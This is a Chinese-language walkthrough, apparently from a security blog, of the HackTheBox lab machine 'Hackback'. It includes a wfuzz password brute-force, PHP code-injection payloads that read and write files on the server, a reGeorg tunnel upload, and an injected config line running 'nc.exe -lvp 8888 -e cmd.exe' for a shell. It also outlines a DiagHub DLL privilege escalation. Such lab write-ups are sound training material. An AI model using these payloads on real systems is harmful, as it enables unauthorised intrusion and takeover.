> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/D4idPo3OpdFXxxpYMIAwCQ)

大余安全  

一个每日分享渗透小技巧的公众号![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPTQKiaXksbZia7PmHLPX2vnCWsznInTj3b9TFYtTDIYG6lDGJZYYSv72NsVWF24Kjlo4MT29tEOQSg/640?wx_fmt=png)

  

  

大家好，这里是 **大余安全** 的第 **84** 篇文章，本公众号会每日分享攻防渗透技术给大家。

靶机地址：https://www.hackthebox.eu/home/machines/profile/176

靶机难度：疯狂（6.5/10）

靶机发布日期：2019 年 5 月 29 日

靶机描述：

Hackback is an insane difficulty Windows box with some good techniques at play. A GoPhish website is discovered which leads us to some phishing vhosts. While fuzzing for files a javascript file is discovered which is rot13 encoded. It contains sensitive information about an admin page which leads to RCE vulnerability. PHP disabled_functions are in effect, and so ASPX code is used to tunnel and bypass the firewall. 

Enumeration of the file system leads to a code injection vulnerability in a configuration file, from which named pipe impersonation can be performed. Enumeration reveals that the user has permissions on a service, which allows for arbitrary writes to the file system. This is exploited to copy a DLL to System32, and triggering it using the DiagHub service to gain a SYSTEM shell.

请注意：对于所有这些计算机，我是通过平台授权允许情况进行渗透的。我将使用 Kali Linux 作为解决该 HTB 的攻击者机器。这里使用的技术仅用于学习教育目的，如果列出的技术用于其他任何目标，我概不负责。

![](https://mmbiz.qpic.cn/mmbiz_png/tnNTe6QOaYx4HLiasWDSSibkvBwkySahn1jUGyrqSWWsCrd8WeibGicCbaDB9b5K4cTlaCxcmzv2uyEWNrQke47Vag/640?wx_fmt=png)

一、信息收集

![](https://mmbiz.qpic.cn/mmbiz_png/ru93nXbREC3lsblTT6unZTCoWcPia8D84uaTauv8WPKZPQAePE6Emc28HfL5UqaUs7ia4J1pib3JRW5sS6TnHViazA/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNEbfHfE6AjBSWGKGiaEkjicSKNPh4pnXPBSznG9XJDf0JuEKtxIg5d30CuVTibwUDeW3MOWaOJPTYKA/640?wx_fmt=png)

可以看到靶机的 IP 是 10.10.10.128....

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNEbfHfE6AjBSWGKGiaEkjicSfc4Fa7fJxMUVEDlia5WWQpt4Z5lmBq6dOBQcZP9cicO7KEh9s79juTIA/640?wx_fmt=png)

IIS 在端口 80 上运行，而未知服务在端口 6666 上运行 HTTPAPI，它允许应用程序之间进行 HTTP 2.0 通信，端口 64831 也开放着....

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNEbfHfE6AjBSWGKGiaEkjicStJglK5laVK9l771J5EEoPDEpSbrlJFPSyPn05vDcV8YZwl66sMdRQg/640?wx_fmt=png)

应该是一头驴.... 应该不是马把...

gubuster 爆破目录没发现有用的...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNEbfHfE6AjBSWGKGiaEkjicSAV6mPx2QmR1ziaUpJk52l1NUEwcG36T21e7MbUSYAUtHOoaaD9Nnfyg/640?wx_fmt=png)

80 信息收集没有用的，转到了 http 2 的 6666 端口上...

访问发现报错... 让我们尝试某些命令... 试试

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNEbfHfE6AjBSWGKGiaEkjicSJklOia2mQ5mn6oEicQpAjicf0AKLz3UHwaovLCEw2cry7nIHoaEdfwjiaQ/640?wx_fmt=png)

```
curl http://10.10.10.128:6666/whoami --http2
```

嗯，可以看到它以 NT authority \ network service 等信息作为响应的，/whoami 列出了有关运行此服务的用户的信息...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNEbfHfE6AjBSWGKGiaEkjicSjNHrmdOSbpcYt91J2jL7vDXN980tMoAXhYRxPQK9n7JJjVUjwVRYPw/640?wx_fmt=png)

list 列出了目录存在的文件...

help 帮助查看可以利用的命令都列举出来的...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNEbfHfE6AjBSWGKGiaEkjicSwZYom3Z9bGNJDGkx4iaMN3cViarO7ID2vJwTfn8hcuYvh7kJXsTx7hAA/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNEbfHfE6AjBSWGKGiaEkjicSCSEZib5YoWL30SeWNZpPuThJ0ImTI51fX0DjlxxicIbmsXDU9crGyic3w/640?wx_fmt=png)

针对端口搜索了下...

netstat 发现了所有开放的端口，135.139.445.3389.6666.5985 端口等等都运行着...

这里卡了一会... 能查询到的信息，还是没暴露出可用的...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNEbfHfE6AjBSWGKGiaEkjicSxJdB5bnRsLZC6kgdAkh4WgWicyUx8NFFFibtO58icLqTgcjGVLcs4BjMg/640?wx_fmt=png)

http 的 64831 也没啥信息...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNEbfHfE6AjBSWGKGiaEkjicSbDgj8wRSJtHibvaA9xtUJ8taMMqSich0pMKdW59S8bZrS8k338nAhbOA/640?wx_fmt=png)

https 的 64831 发现这是一个站点，还是 GoPhish 的登陆页面...Gophish 是一个开放源代码的网络钓鱼框架...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNEbfHfE6AjBSWGKGiaEkjicSbhmLAV6MV4KPCH9jtmMHOTrEy490iaOap4ybVQIraKwN8icMHfFMicKwg/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNEbfHfE6AjBSWGKGiaEkjicSmYvxVc85px87CFwDsbYvVVlZuTn4GmIFKKpGDDjictEicc8OCP9g351g/640?wx_fmt=png)

可以看到搜索 GoPhish 页面，找到了默认的登陆账号密码：

```
Username: admin   Password: gophish
```

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNEbfHfE6AjBSWGKGiaEkjicSmmhhdlGhMNuI83jndxq2iaGvqUt2QDeTj93iaUdpVn6m42zwImO8rjKA/640?wx_fmt=png)

成功登陆进来了... 这里还 google 登陆了，火狐不稳定登陆这个页面

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNEbfHfE6AjBSWGKGiaEkjicSIG4sxhtBiaLKC9MQtqgGems6lNiaAKwtgica6TXAKbUdlYWmmTJyTwvNQ/640?wx_fmt=png)

可以看到在模板下，存在 5 封邮件模板...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNEbfHfE6AjBSWGKGiaEkjicSdmUjXUiaFdBON1I6wBh7AVly8bzs3jElUhFNW5K0DgI48NN5TeLvGhg/640?wx_fmt=png)

这里发现了一个页面... 子域名...

另外四个模板下，都存在了不同的钓鱼页面... 添加到 DNS 都能访问，但是只有 admin 是子域名形式...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNEbfHfE6AjBSWGKGiaEkjicSUvR4HuWIhQjKZzubhxxwxhX30MBpzax94ich4kdFZxz7ZicuPsLzzatg/640?wx_fmt=png)

经过登陆 admin.hackback.htb 子域名应该是可利用的... 往这走下去...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNEbfHfE6AjBSWGKGiaEkjicS8ErhIGOOrZdxf24PIe6coa1y3cM5os6QwAlFIwO4QYdpJOykNwYqNw/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNEbfHfE6AjBSWGKGiaEkjicSyEImYAniajLQyJLZdoFwmicQJ7aEceWGs91T5WJsjyq2VtD1eC4IUIwQ/640?wx_fmt=png)

密码重置和注册页面都是 404... 查看下前端源码...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNEbfHfE6AjBSWGKGiaEkjicS5ZMciaFvWG40ckqI6EwVa4QYEHMG0lxBNK67Kiaug2d168aNlIIWy8Nw/640?wx_fmt=png)

前端源码 js/js，底层可能存在 js 的文件.. 爆破看看

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNEbfHfE6AjBSWGKGiaEkjicSgAKaOf69LeP2NWViayQbXXe2U5x41VK9J9qU75N33sUj7nalyIlszjg/640?wx_fmt=png)

```
gobuster dir -u http://admin.hackback.htb/js/ -w /usr/share/wordlists/dirb/common.txt -x js
```

发现了 private.js，去看看

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNEbfHfE6AjBSWGKGiaEkjicSXCwZehlaicIY7FOVhHVnvnKrWLVgzHqDgRwHShEFibXwzcticZpyFLPJg/640?wx_fmt=png)

又是 404？？？

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNEbfHfE6AjBSWGKGiaEkjicSYII1T6lPsywkkqU3Jz03ysW0NP2wDGmfekKjl60icBc1VicFoaAzT7cA/640?wx_fmt=png)

提示：您正在寻找的资源可能已被删除，名称已更改或暂时不可用。

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNEbfHfE6AjBSWGKGiaEkjicSIVVwZM1sOSozDaH9sxdjuSgTTPfVvlCXHGOicBG7hgCXZAleicmqseSA/640?wx_fmt=png)

通过查看 js 目录....private.js 文件包含一些混淆的 javascript... 注意到该 ine x = 模式在源代码中重复了几次...

ine 它是 var 的 rot13 编码的字符串... 进行转码试试

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNEbfHfE6AjBSWGKGiaEkjicS34cArYfjNzXwWvqVeXYTMcP6bXiaL4ku54ajSORkiaoVXX44NLapU3icg/640?wx_fmt=png)

是成功转码的....https://rot13.com/

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNEbfHfE6AjBSWGKGiaEkjicSLy5aIa7u15C2aeeAMYHickpicibhjJib8Tserkn2OAqBw7cOXKB5XTwSEA/640?wx_fmt=png)

```
https://beautifier.io/
```

通过 beautifier.io 解码 script 信息...

这里只需要读取 x z h y t s i k w 即可

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNEbfHfE6AjBSWGKGiaEkjicSjFk0fy1kFmVYn1XwLykLIPh14XjjSw46Qcl8xbzUCWZ3icMAtXu3HVg/640?wx_fmt=png)

F12 打开浏览器 JavaScript 的控制台，将变量复制进去，输出即可..

为了安全登陆绕过行为，存在一个秘密目录 / 2bb6916122f1da34dcd916421e531578，找到该目录后应该含有注入? action...

该目录应允许我们访问，当我尝试访问该目录时，我得到了 302 重定向而不是 404 重定向，因此知道这是一个有效目录...（重定向到了登陆页面）

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNEbfHfE6AjBSWGKGiaEkjicSuiabqKfHZ3CZw4ibsu2021mN0VUhyQ3J97z8S1MgI80I8tUdlkrVbjQw/640?wx_fmt=png)

爆破发现了存在 / webadmin.php 文件... 去看看

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNEbfHfE6AjBSWGKGiaEkjicSWUptkBG90FEkCSnQqdibbXD5HILnqwkINcIiceGbtDmibJHlH0JQ3UcTA/640?wx_fmt=png)

这里在浏览器很麻烦，开始利用 burp suit，发现又重定向到了 302...

回看 JavaScript... 获得的信息

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNEbfHfE6AjBSWGKGiaEkjicSOuvSticKW5LicZyqGuCl9lSM8D7R53c4mOjUbHmn62NoYWA7nd1v0Rzg/640?wx_fmt=png)

```
?action=show&site=hackthebox&password=********&session=
?action=list&site=hackthebox&password=********&session=
?action=exec&site=hackthebox&password=********&session=
?action=exec&site=hackthebox&password=********&session=
```

四种针对 hackthebox 进行注入组...

只有第二组和第三组有数据返回...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNEbfHfE6AjBSWGKGiaEkjicStibTibuuGKE696nOEXZkHXTlWu1ygTYb517uZQ8GTGvfJn8AqmvsUJHg/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNEbfHfE6AjBSWGKGiaEkjicSqXusBq7m6QmMIO9pTmor578icQTItZVuhhHJ9iafwDWBSXD9HuwYBa4w/640?wx_fmt=png)

Wrong secret key! 和 Missing command...

提示错误的密匙和缺少了命令... 缺少命令先不管... 因为给的信息就这么多.. 密匙不对，可以找...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNEbfHfE6AjBSWGKGiaEkjicSjTbsYJqpkYKricNmVL5FsKn4su8nMlBB53eke3PeTic8SmUDyh1HxF6g/640?wx_fmt=png)

```
https://github.com/danielmiessler/SecLists
```

这里利用 SecLists 集成文本，感谢麻省理工的大佬们！！

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNEbfHfE6AjBSWGKGiaEkjicSR0Xk3vKTib7DOzlZ8zgs1Xg8j4aHk4jyJX5mMqDKHyYdadUt1xyrpOA/640?wx_fmt=png)

```
wfuzz -c -w darkweb2017-top1000.txt --hw 0 --hh 17 'http://admin.hackback.htb//2bb6916122f1da34dcd916421e531578/webadmin.php?action=list&site=hackthebox&password=FUZZ&session='
```

利用 wfuzz 爆破获得 12345678 密码，marine 无长度，先不管...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNEbfHfE6AjBSWGKGiaEkjicS8uemLOsKr3eIKLkJpPrIq2w8lxNgic2YthDfl8yoNaD8KwHtEiaCByWQ/640?wx_fmt=png)

虽然还是 302，但输出信息了：

```
e691d0d9c19785cf4c5ab50375c10d83130f175f7f89ebd1899eee6a7aab0dd7.log
```

这里尝试修改了很多地方.. 但是返回的不是命令错误，302 输出的信息...

这只单单是 admin.hackback.htb 子域名的登陆页面获取了以上信息...

继续对 Gophish 五大模块中获得到的域名进行分析...

```
www.hackthebox.htb
www.twitter.htb
www.paypal.htb
www.facebook.htb
```

这四个域名都添加到 DNS...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNEbfHfE6AjBSWGKGiaEkjicSk6wFVbdcHkibA0OlX1GJYAG2I6nuMZLyCcE5VUib3jZbHQ59Gnk2qKyA/640?wx_fmt=png)

先分析第一个...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNEbfHfE6AjBSWGKGiaEkjicSYFUsMFibTaC3ia9ziaKtGrjfTWgvOgRBxjQJYicMWWaLwsuGZPdWZiayicsQ/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNEbfHfE6AjBSWGKGiaEkjicSoTMKdiatJeQXszuZNL5dbibib0RD7XDm37zjAnVNaLLniaiaoam2vEcicEYw/640?wx_fmt=png)

可以看到，当我在 www.hackthebox.htb 的页面输入用户名密码... 在之前的注入中都能显示出来..

测试后，只有 show+session 才可以显示出来...

这里 list 和 show 都是 php 中的命令... 这里进行了 php 注入的测试...

```
emile输入：<?php echo "dayu"; ?>
password输入：<?php echo "dayu123"; ?>
```

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNEbfHfE6AjBSWGKGiaEkjicS0jFGspCXfImm5Rubn14oMAQTWbdticIoI8ksT2oN0Novk5or3mmPjIw/640?wx_fmt=png)

说明存在 php 注入，可以利用 php 进行写入和读取.. 测试看看

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNEbfHfE6AjBSWGKGiaEkjicSnxKl3ytG6rkibQ9YibAbcicyxDyl3yWR43aexNI9euQiacTrztNVUGAZ3Q/640?wx_fmt=png)

当我在 www.hackthebox.htb 页面 passwd 输入：

```
<?php echo print_r(scandir($_GET['dir'])); ?>
```

输出的是 dir 查询到本目录下存在的文件信息... 可以读取... 继续测试写入

利用 file_put_contents 在目标上写入文件...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNEbfHfE6AjBSWGKGiaEkjicSdSMwqibicKT3HXkmBZoW7uYsibMDpNY4aaicv3eicxicicewdmsFXdJP5MtLw/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNEbfHfE6AjBSWGKGiaEkjicSibRI8NL48ULJ8Fl9HcicabWAt0XPUttURicIkumxJlc3R1sv7P3AEoVSw/640?wx_fmt=png)

在 password 输入：

```
<?php $f = "ZGF5dSBkYXl1IGhlbGxvCg=="; file_put_contents("dayu.txt", base64_decode($f)); ?>
```

已经成功写入了该文件...

继续输入：

```
<?php include($_GET['file']);?>
```

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNEbfHfE6AjBSWGKGiaEkjicS1PlCpZKUYjogYR69eHGJSTh2xz2iaxWNia9m4D5LakjqGiceOQnJ0pWYQ/640?wx_fmt=png)

可以看到... 读取了文本的刚写入的信息...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNEbfHfE6AjBSWGKGiaEkjicSyRx282JGtwNRG53mt6E7sLEibcPu9ibuEMBp8BZf3GElx31L1b8cyFQw/640?wx_fmt=png)

```
<?php print_r(scandir('..')); ?>
```

返回上一目录查看，web.config 和 web.config.old 查看下..

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNEbfHfE6AjBSWGKGiaEkjicSE9U9HXoWd8r07h9oGDZXhr6ib6fhE92NwontygkkvIEHYKbnleEYoRA/640?wx_fmt=png)

```
<?php echo file_get_contents('../web.config.old'); ?>
userName=simple
password=ZonoProprioZomaro:-(
```

发现了用户名密码...

二、提权

![](https://mmbiz.qpic.cn/mmbiz_png/ru93nXbREC3lsblTT6unZTCoWcPia8D84uaTauv8WPKZPQAePE6Emc28HfL5UqaUs7ia4J1pib3JRW5sS6TnHViazA/640?wx_fmt=png)

测试结果可以读取可以写入... 而且内容需要 base64 才可以写入..

这里的思路是，找到可写入的文件，或者自己写 shellcode 进行提权即可...

可以知道前面 5985 端口运行着，可以使用 winrm 进行登陆...

```
https://github.com/sensepost/reGeorg
```

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNEbfHfE6AjBSWGKGiaEkjicSMuSpCaBH6V6ZQ8XYULBCljjfTsyesLvgyDoYM2bmzFZRbrThSBod1g/640?wx_fmt=png)

跟着步骤走即可...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNEbfHfE6AjBSWGKGiaEkjicSsXp6MDTQtR5noe9OGKtc0uPyewu6vNhk3AtIZUBjTqQEtY8ej7WQWw/640?wx_fmt=png)

编译 tunnel.aspx 为 base64

```
<?php file_put_contents("tunnel.aspx",base64_decode("base64值")); ?>
```

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNEbfHfE6AjBSWGKGiaEkjicSzlDmEWtCHCsUUgmfO38nGdJOxF7Via61mMFwUicFJicNGzSwnttV6ZsUQ/640?wx_fmt=png)

结果很好，隧道建立了

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNEbfHfE6AjBSWGKGiaEkjicSjR3bbZ3pML13Srpt7114wdLbZJHiaAhOA6OOFiaibnAKV81OJbDo4pD0A/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNEbfHfE6AjBSWGKGiaEkjicSFl1FQaSbY4TjWV7E5ad9eAibM0DPu09gg7M9dJDk9aViaV9fcykDvNIw/640?wx_fmt=png)

这里出了点错误... 问题不大

很好，建立了链接...

```
https://github.com/Alamot/code-snippets/tree/master/winrm
```

这里使用 winrm 的 winrm_shell_with_upload.rb 来写 EXP 即可...

```
wget https://github.com/Alamot/code-snippets/raw/master/winrm/winrm_shell_with_upload.rb
```

下载即可  

开始写入 EXP 即可...

这里需要：

```
userName=simple
password=ZonoProprioZomaro:-(
```

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNEbfHfE6AjBSWGKGiaEkjicSmWLxaeH2o4E1FxojN8fl15U1k4FMRicnNuDSARlPaT8gWardTysrsag/640?wx_fmt=png)

开始开始，这里有点坑...

```
1.记得是https改成http...
2.账号记得加hackback不然链接补上...
3.urllib3库完整性问题
这里坑了我点时间...不过也算熟悉了
```

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNEbfHfE6AjBSWGKGiaEkjicSpk13aE54P69RIa4YQM4tgj0iaSuMqEryn9nUxRkcwLAPyU6hJ37famg/640?wx_fmt=png)

成功连接...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNEbfHfE6AjBSWGKGiaEkjicSzo5NkLQf85ataeys6iaotEgbqYbgZfQqop14XpK4orXInAX5D0knC6g/640?wx_fmt=png)

此脚本包含恶意内容，已被您的防病毒软件阻止...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNEbfHfE6AjBSWGKGiaEkjicSjSLMibcXkEl6FWntlN9VlFXtFDCEGLhxoGaHll9qYab6hTLibr6LicB4g/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNEbfHfE6AjBSWGKGiaEkjicSDpjlTKJlibZxGktRnHCUx7NUaWRddlTZBL6yEAnYvtic3cR5ulUHbpbw/640?wx_fmt=png)

查看了防火墙，默认为禁止进出，制定了两个规则，在两个位置允许 ping 和使用三个端口... 都没启用出口流量限制...

这里本来是可以利用 proxychains3 winrm_shell_with_upload.rb 进行 upload 的，因为 winrm 具有 UPLOAD 下载功能，winrm_shell_with_upload 的 RB 中针对 winrm 的 upload 写了 EXP 代码，但是我无法执行！！！目前还在找原因... 只能用老版本 winrm_shell.rb 进行连接，如果用 upload 直接就能用 NC 反弹个 shell 即可...

继续在内部找漏洞吧！！！

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNEbfHfE6AjBSWGKGiaEkjicSQibJJ32setum5ar3CKfJV9BDCL33rjhrFrIlibzfKDxF5L5jyekvib1Zw/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNEbfHfE6AjBSWGKGiaEkjicSR8UbibftsAtIoicFzPNibOd9sQVrrrYsibNPK6Dpze7vibibKubtKNNIwJwQ/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNEbfHfE6AjBSWGKGiaEkjicSm8Iib1WoWZI7NiciaHbQ0icajKtEcr6a9ZswjU0iahF2f8edt42qWZ1yNOQ/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNEbfHfE6AjBSWGKGiaEkjicSw77yGJ3AOhCsTJMbhdzV4WZtS1SZXN21CGzlxhj9T8oibQnP2RQcibnA/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNEbfHfE6AjBSWGKGiaEkjicSmxxRicd63RevPvHib5MgxmPEicVLDgaxlIiatztUXRAGQiaoakia8dskqHPQ/640?wx_fmt=png)

可以看到 clean.ini 定义了三个变量，这里有隐藏文件 dellog.bat，它会随着 batch.log 开始和停止时间进行更新运行 dellog.ps1，然后循环遍历所有 bat 文件并运行...

这里只需要将 nc 执行反向 shell 的命令写入 clean.ini 即可...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNEbfHfE6AjBSWGKGiaEkjicSpQicicAuqR7ibCiaVGZzIQIgeMibKWYIe5YtlTaasdQElFReW1ibLNxk53eQ/640?wx_fmt=png)

这里我将 proxychains winrm_shell.rb 改成了 proxychains3 upload，遇到了几个问题.. 实在无法解决，通过 ippsec 解决了问题，感谢大佬！

成功上传 NC...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNEbfHfE6AjBSWGKGiaEkjicSqiaYcJff6DG9Fib73SA7bsNqicwKypAW37ZUURtQiaVF1Lr9AkUPax1qFA/640?wx_fmt=png)

```
echo [Main] > C:\util\scripts\clean.ini
echo LifeTime=100 >> C:\util\scripts\clean.ini
echo "LogFile=c:\util\scripts\log.txt & cmd.exe /c C:\windows\system32\spool\drivers\color\nc.exe -lvp 8888 -e cmd.exe" >> C:\util\scripts\clean.ini
echo "Directory=c:\inetpub\logs\logfiles" >> C:\util\scripts\clean.ini
```

等待几分钟... 成功获得了反向外壳...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNEbfHfE6AjBSWGKGiaEkjicS5KyFMughaBAvH8FHmcbdjlfFKv0iaxTfiaFHuaSh76es8IvbuGRcOLFQ/640?wx_fmt=png)

方然还可以这么提权... 但是获得的 shell 会快很多，但是无法进入 hacker... 还是得回到前面的方法...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNEbfHfE6AjBSWGKGiaEkjicSLBuJcSlpgHzPRppDib5Fdibvt4MSjRanzQX3b5MicwzbkYtfsxuEib9vsA/640?wx_fmt=png)

成功获得了 user 信息...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNEbfHfE6AjBSWGKGiaEkjicSDiaph2KgVcBInSap3M1QWB4kQrlwsS1LAribwqWTKrwVgu0B4AwCfMMw/640?wx_fmt=png)

在查看系统时，发现一个无法识别的服务正在运行着...UserLogger.exe

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNEbfHfE6AjBSWGKGiaEkjicSdJwOWwBpibIgsG0ibicGDdTtMaU5uib9TrEj7mlHaiaa45uWYAmTR7w7uNQ/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNEbfHfE6AjBSWGKGiaEkjicSibdT1pZiaua1ydAyFFU3KxKcy7OfNWvnsq3ib1z5XF9VKbsYFl7aEczzg/640?wx_fmt=png)

Description 表示它负责记录用户活动，我尝试用以下方式启动该服务，可以看到它被允许启动和停止服务...

开始进行测试，创建了一个测试文件 test.txt 然后重新启动了服务，通过附加. log 到我给的路径并保存在那里，读取创建了日志...

**F：** 可以看到日志文件的权限是完全打开的，并且可以更改内容...

  

  

方法 1：

![](https://mmbiz.qpic.cn/mmbiz_png/SNCWuBRAEwaTLSfnPyia62ZtcMGcvBKAbDDCI0aY8BhzwEYtfGpS2IRFm5v5ib4t3RxrfmlbCibhjya0eksAVv5qw/640?wx_fmt=png)

可以利用：删除. log 文件，进行直接查看 root 信息

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNEbfHfE6AjBSWGKGiaEkjicSs9kUS3X616h2ib6VoNia9wRFaswsKLUApqriaUpHduiaG6tfJYicVagnOWQ/640?wx_fmt=png)

想法是可行的，直接开始

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNEbfHfE6AjBSWGKGiaEkjicSu9icTfxq7APBp2Bicv1AmibzTujDHFEoibX4HppCylFh6C8WT6LQicJ8VlQ/640?wx_fmt=png)

已经在 desktop 下创建了 root.txt 文件...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNEbfHfE6AjBSWGKGiaEkjicSEeKKcruDLzmF1NFofGc23iaib7Zud9iaicjc4yMrQJ4TybKovFAWt1VBIw/640?wx_fmt=png)

有效果的，复制出来了...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNEbfHfE6AjBSWGKGiaEkjicScO4ev4TTJ8rrXactRictRcfWzABbLc3wus1a6oPfKjVMZdic8jOApJWg/640?wx_fmt=png)

成功查看了 root... 是个图像...

```
wget https://docs.microsoft.com/en-us/sysinternals/downloads/streams
```

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNEbfHfE6AjBSWGKGiaEkjicSWHnKDFiaic6J616omNb3sQE1dibwJa5cTTpzOo7a4zHFXdI52wMjIwjuA/640?wx_fmt=png)

这里将利用 Streams 查看 desktop 底层数据信息流，上传即可...  （前面几章也讲过类似的底层查看数据流）

也可以利用 powershell 查看数据流... 但需要进入 desktop 目录... 所以这是在管理员权限下利用的...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNEbfHfE6AjBSWGKGiaEkjicSnAIyhuARjl4NIdBcm1NkWN0ylcLheDjJ9ukv2XeU68yunvxicbGsQRg/640?wx_fmt=png)

成功上传...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNEbfHfE6AjBSWGKGiaEkjicSXdGAUN7VxdHsZGBgKl0RemEjKAicmFvsicE7A7ib64HaRFwRKickHyUickg/640?wx_fmt=png)

```
c:\windows\system32\spool\drivers\color\streams.exe -accepteula root.txt
```

.log 是 UserLogger 生成的，所以只需要查看 flag.txt 即可... 成功获得了 root 真实信息...

**

  

  

方法 2：

![](https://mmbiz.qpic.cn/mmbiz_png/SNCWuBRAEwaTLSfnPyia62ZtcMGcvBKAbDDCI0aY8BhzwEYtfGpS2IRFm5v5ib4t3RxrfmlbCibhjya0eksAVv5qw/640?wx_fmt=png)

2018 年 4 月，谷歌的项目发布了一篇文章 [Windows 漏洞利用技巧](https://googleprojectzero.blogspot.com/2018/04/windows-exploitation-tricks-exploiting.html)：利用任意文件写入来提升本地特权。

这是一个漫长而复杂的文章，它涉及几个有趣的漏洞，但与如何从任意写入中获取 SYSTEM 的论点相类似，这篇文章中的 TL 和 DR 是 DCOM 公开 DiagHub 的服务，可以指示该服务从 system32 系统内部加载 dll ，实际上，在执行此加载操作时，它无需检查文件的扩展名即可执行此操作。因此只要可以将 dll 写入 system32，就可以要求 DiagHub 为此加载它..

一个更著名的例子是 Sandbox Escaper 的 ALPC 漏洞，该漏洞利用了用户调用高级本地过程调用（ALPC）端点以更改文件权限的能力 C:\Windows\tasks\UpdateTask.job，该文件默认情况下不存在，用户可以将其创建为与其他文件相关联的硬链接，并获得写访问权限。在原始 POC 中，作者方法是重写 printconfig.dll，然后使用假脱机服务来调用它。但是 RealOriginal 在 GitHub 上有一个 poc，它使用现已打补丁的漏洞利用 \ windows\system32\license.rtf 进行 dll 覆盖，然后使用 DiagHub 调用它...

```
github：https://github.com/realoriginal/alpc-diaghub
```

这里将利用 realoriginal/alpc-diaghub 的源码进行提权，我不是开发出身，只有能力利用了... 谢大佬

